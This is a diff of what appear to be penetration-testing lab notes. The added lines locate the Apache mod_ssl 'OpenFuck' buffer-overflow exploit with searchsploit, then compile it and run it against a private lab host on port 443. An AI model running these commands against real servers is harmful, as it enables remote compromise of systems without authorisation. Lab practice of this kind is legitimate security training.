@@ -60,3 +60,10 @@ nmap --script smb-vuln* -p 139 192.168.111.129
   |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
 
 searchsploit openfuck
+  Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                              | exploits/unix/remote/21671.c
+  Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                        | exploits/unix/remote/764.c
+  Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                        | exploits/unix/remote/47080.c
+
+apt-get install libssl-dev
+gcc -o OpenFuck 47080.c -lcrypto
+./OpenFuck 0x6b 192.168.111.129 443 -c 40
